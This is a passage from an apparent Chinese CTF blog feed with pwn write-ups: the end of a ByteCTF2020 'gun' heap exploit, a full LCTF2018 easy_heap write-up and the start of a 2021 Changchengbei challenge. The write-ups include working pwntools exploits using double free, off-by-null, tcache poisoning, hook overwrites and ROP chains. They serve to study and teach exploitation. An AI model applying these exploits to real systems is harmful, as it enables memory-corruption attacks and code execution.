function_">shoot</span>(<span class="hljs-params">times</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Shoot time: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(times).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which one do you want to load?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Bullet price: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Bullet Name: &quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave_name</span>(<span class="hljs-params">name</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your name: &quot;</span>)<br>    p.sendline(name)<br><br><br>leave_name(<span class="hljs-string">&quot;sh0ve1&quot;</span>)<br><br><span class="hljs-comment"># leak libc </span><br>buy(<span class="hljs-number">0x4c0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x4c0</span>) <span class="hljs-comment">#0  0x4d0=0x70*0xb</span><br>buy(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span><br><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>) <span class="hljs-comment"># unsorted bin</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<span class="hljs-comment">#0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 为什么申请之后，fd和bk的值变了，不是main_arena+96</span><br>libc.address = (u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span>) - <span class="hljs-number">0x1ec000</span> <br>__free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>svcudp_reply_26 = libc.address + <span class="hljs-number">0x157d70</span> + <span class="hljs-number">26</span> <span class="hljs-comment">#libc.sym[&#x27;svcudp_reply&#x27;]</span><br>log.success(<span class="hljs-string">&quot;libcbase :&quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#3</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#6</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#9</span><br><br>load(<span class="hljs-number">0</span>)<br>load(<span class="hljs-number">2</span>)<br>shoot(<span class="hljs-number">2</span>)<br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;&#x27;</span>) <span class="hljs-comment">#0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;The &quot;</span>)<br>heapbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x340</span><br>log.success(<span class="hljs-string">&quot;heapbase: &quot;</span> + <span class="hljs-built_in">hex</span>(heapbase))<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2 此时idx=2的chunk的next_bullet依旧是idx=0</span><br><br><span class="hljs-comment"># 用idx=3~9的填满tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    load(i+<span class="hljs-number">3</span>)<br>shoot(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># 先将idx=0放入fastbin</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># load一次，射击两次，利用next_bullet来double free idx=0（连续射击时没有检查flag）</span><br>load(<span class="hljs-number">2</span>)<br>shoot(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># idx=0,2~7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x60</span>)<br><br>buy(<span class="hljs-number">0x60</span>,p64(__free_hook)) <span class="hljs-comment">#8</span><br><br>str_flag = heapbase + <span class="hljs-number">0x340</span><br>frame_addr = heapbase + <span class="hljs-number">0x7c0</span> <br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">svcudp_reply+26</span><br><span class="hljs-string">mov rbp, qword ptr [rdi + 0x48]; </span><br><span class="hljs-string">mov rax, qword ptr [rbp + 0x18]; </span><br><span class="hljs-string">lea r13, [rbp + 0x10]; </span><br><span class="hljs-string">mov dword ptr [rbp + 0x10], 0; </span><br><span class="hljs-string">mov rdi, r13; </span><br><span class="hljs-string">call qword ptr [rax + 0x28];</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># way 2</span><br>rop = ROP(libc)<br>rop.<span class="hljs-built_in">open</span>(str_flag,<span class="hljs-number">0x4</span>)<br>rop.read(<span class="hljs-number">3</span>,str_flag,<span class="hljs-number">0x30</span>)<br>rop.write(<span class="hljs-number">1</span>,str_flag,<span class="hljs-number">0x30</span>)<br><br>leave_ret = libc.address + <span class="hljs-number">0x5aa48</span><br>pop_r14_r15_ret = libc.address + <span class="hljs-number">0x26b6f</span><br>frame = p64(pop_r14_r15_ret)*<span class="hljs-number">3</span> + p64(heapbase + <span class="hljs-number">0x2d0</span>) <span class="hljs-comment"># heapbase + 0x2d0=rax=[rbp+0x18]</span><br>frame += rop.chain() <span class="hljs-comment">#pop_r14_r15_ret </span><br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>) <span class="hljs-comment">#9 </span><br>buy(<span class="hljs-number">0x100</span>,<span class="hljs-built_in">bytes</span>(frame)) <span class="hljs-comment">#10 frame_addr=rbp</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x28</span> + p64(leave_ret)+<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x30</span>)<span class="hljs-comment">#11 heapbase + 0x2d0</span><br>buy(<span class="hljs-number">0x60</span>,p64(svcudp_reply_26)) <span class="hljs-comment">#12 修改__free_hook为svcudp_reply_26</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span> + p64(frame_addr) <span class="hljs-comment">#frame_addr=rbp=[rdi+0x48]</span><br>buy(<span class="hljs-number">0x60</span>,payload) <span class="hljs-comment">#13 rdi</span><br><br>load(<span class="hljs-number">13</span>) <span class="hljs-comment"># trriger</span><br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul><li>利用结构体管理堆块时，一定要注意结构体中的数据在malloc和free时有什么变化</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://hurricane618.me/2020/10/26/2020-bytectf-gun/">https://hurricane618.me/2020/10/26/2020-bytectf-gun/</a></li><li><a href="https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%98%EF%BC%9Abytectf2020-gun-Use-After-Free-fastbin-double-free-ORW">https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%98%EF%BC%9Abytectf2020-gun-Use-After-Free-fastbin-double-free-ORW</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>double free</tag>
      
      <tag>ORW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LCTF2018 easy_heap</title>
    <link href="/2021/11/17/LCTF2018-easy-heap/"/>
    <url>/2021/11/17/LCTF2018-easy-heap/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2018年的<code>LCTF</code>中的一道题，借此学习<code>off-by-null</code>。</p><h2 id="0x1-题目情况"><a href="#0x1-题目情况" class="headerlink" title="0x1 题目情况"></a>0x1 题目情况</h2><ul><li>采用<code>libc-2.27.so</code>（2.27-3ubuntu1_amd64）</li><li><code>file easy_heap</code><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">easy_heap</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped<br></code></pre></td></tr></table></figure></li><li><code>checksec easy_heap</code> 保护全开<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><ul><li>add： 只能同时存在10个chunk，index从0到9按是否空闲依次分配，每次申请的堆块大小固定，都是0x100，可以自定义不超过chunk大小的内容长度length，然后利用自定义函数<code>sub_BEC</code>输入至多length个字节的内容。此外，会把chunk的地址和内容长度length依次保存在大小为0xA0的管理堆块之中；</li><li>sub_BEC：根据传入的指针和写入长度，逐字节写入，需要注意的是不能写入<code>\x00</code>。写入完成之后，在最后一字节之后添加<code>\x00</code>，并且将<code>addr[size]</code>处也置为0，这导致了<code>off-by-null</code>漏洞。</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title">myRead</span><span class="hljs-params">(_BYTE *addr, <span class="hljs-type">int</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> it; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  it = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( size )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;addr[it], <span class="hljs-number">1uLL</span>);<br>      <span class="hljs-keyword">if</span> ( size - <span class="hljs-number">1</span> &lt; it || !addr[it] || addr[it] == <span class="hljs-string">&#x27;\n&#x27;</span> )<span class="hljs-comment">// 不能写入\x00</span><br>        <span class="hljs-keyword">break</span>;<br>      ++it;<br>    &#125;<br>    addr[it] = <span class="hljs-number">0</span>;                               <br>    addr[size] = <span class="hljs-number">0</span>;<span class="hljs-comment">// off-by-null</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *addr = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>show：利用<code>puts</code>函数打印堆块内容；</li><li>delete：先使用<code>memset</code>函数清除堆块的内容，然后free这个堆块，最后将指针和length都置为0。</li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ol><li>这个程序只有一个漏洞<code>off-by-null</code>，因此要尝试通过该漏洞来构造处<code>chunk overlapping</code>，从而利用<code>tcache posioning</code>修改任意地址；</li><li>由于释放一个堆块之前会先清除堆块内容，所以不能使用修改<code>__free_hook</code>为<code>system</code>的方式来，只能尝试修改<code>__malloc_hook</code>为<code>one_gadget</code>，要使用<code>one_gadget</code>就必须先要获取libcbase；</li><li>由于申请堆块写入数据时一定会在写入最后添加<code>\x00</code>且<code>puts</code>存在<code>\x00</code>截断，所以无法直接通过填满tcache,然后申请<code>unsorted bin</code>中的chunk，输出脏数据的方式获取libcbase；</li><li>由于无法写入<code>\x00</code>且每个chunk的大小都是0x100(有一个字节的<code>\x00</code>)，所以无法通过修改<code>size</code>来构造<code>chunk overlapping</code>，也无法直接利用堆写入伪造pre_size，因此只能尝试利用脏数据（pre_size处的）来构造<code>chunk overlapping</code>；</li><li>要进行<code>chunk overlapping</code>，至少需要3个物理相邻的chunk，再加上填充<code>tcache</code>的七个chunk，所以至少需要十个chunk，具体操作请阅读这篇<a href="https://blog.csdn.net/qq_41202237/article/details/113697892">文章</a>。</li></ol><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><p><strong>注意堆块的物理内存与index对应关系的变化</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :off-by-null + tcache poisoning</span><br><span class="hljs-string">@时间        :2021/11/16 15:08:24</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = 0<br><br>p = process(<span class="hljs-string">&#x27;./easy_heap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc64.so&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(size, content):<br>    p.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(b<span class="hljs-string">&#x27;size \n&gt; &#x27;</span>)<br>    p.sendline(str(size))<br>    p.recvuntil(b<span class="hljs-string">&#x27;content \n&gt; &#x27;</span>)<br>    p.sendline(content)<br><br>def free(index:int):<br>    p.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(b<span class="hljs-string">&#x27;index \n&gt; &#x27;</span>)<br>    p.sendline(str(index))<br><br>def show(index:int):<br>    p.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(b<span class="hljs-string">&#x27;index \n&gt; &#x27;</span>)<br>    p.sendline(str(index))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10):<br>    <span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&#x27;A&#x27;</span><span class="hljs-number">*0</span>xE0)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    free(9-i)<br><br>free(0)<br>free(1)<br>free(2)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10):<br>    <span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&#x27;B&#x27;</span><span class="hljs-number">*0</span>xE0)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(6):<br>    free(i)<br><br>free(8)<br>free(7)<br><span class="hljs-built_in">add</span>(0xF8,<span class="hljs-string">&quot;set pre_inuse&quot;</span>) # <span class="hljs-attribute">idx</span>=0<br>free(6) # 此处不能删除刚申请的<span class="hljs-attribute">idx</span>=0,因为会破坏idx=9的pre_size<br>free(9)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&quot;C&quot;</span><span class="hljs-number">*0</span>xE0)<br><br><span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&quot;C&quot;</span><span class="hljs-number">*0</span>xE0)<br>show(0)<br>libcbase = u64(p.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x3ebca0<br>one = libcbase + 0x10a38c # 0x4f2c5 # 0x4f322 #0x10a38c<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + hex(libcbase))<br><br><span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&#x27;C&#x27;</span><span class="hljs-number">*0</span>xE0) # idx = 9    <span class="hljs-attribute">idx</span>=0与idx=9指向同一个chunk<br><br>free(1)<br>free(2) # 这两个是为了空出2个指针来修改触发hook<br><br>free(9)<br>free(0)<br><span class="hljs-built_in">add</span>(0xE0,p64(malloc_hook)) # <span class="hljs-attribute">idx</span>=0<br><span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&#x27;D&#x27;</span><span class="hljs-number">*0</span>xE0) # <span class="hljs-attribute">idx</span>=1<br><span class="hljs-built_in">add</span>(0xE0,p64(one)) # <span class="hljs-attribute">idx</span>=2<br><br><span class="hljs-comment"># trigger</span><br>p.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recv()<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul><li><a href="https://blog.csdn.net/qq_41202237/article/details/113697892">https://blog.csdn.net/qq_41202237/article/details/113697892</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>off-by-null</tag>
      
      <tag>tcache poisoning</tag>
      
      <tag>chunk overlapping</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021长城杯-K1ng_in_h3Ap_II</title>
    <link href="/2021/11/06/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-II/"/>
    <url>/2021/11/06/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-II/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2021年长城杯的第二道pwn题。</p><h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul><li>使用libc-2.27.so(2.27-3ubuntu1.4_amd64)</li><li><code>file pwn</code></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1.<span class="hljs-number">4</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">4</span>f886125657df201de046e4b5f400f74cdb28eca, stripped<br></code></pre></td></tr></table></figure><ul><li><code>checksec pwn</code> <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure></li><li><code>seccomp-tools dump ./pwn</code> <figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns">  line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">A</span> = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x05 <span class="hljs-number">0</span>xc000003e  if (<span class="hljs-keyword">A</span> != ARCH_X86_64) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35 0x00</span> <span class="hljs-number">0</span>x01 <span class="hljs-number">0x40000000</span>  if (<span class="hljs-keyword">A</span> &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x02 <span class="hljs-number">0</span>xffffffff  if (<span class="hljs-keyword">A</span> != <span class="hljs-number">0</span>xffffffff) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003b  if (<span class="hljs-keyword">A</span> == execve) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW<br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><ul><li>add: 由于可覆盖idx，所以可以申请任意个堆块，堆块大小限制为0xF~0x60，申请成功之后就把地址和堆块大小分别存储在两个数组中； <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">_DWORD *add()<br>&#123;<br>  _DWORD *result; <span class="hljs-regexp">//</span> rax<br>  int idx; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">8</span>h]<br>  int size; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span 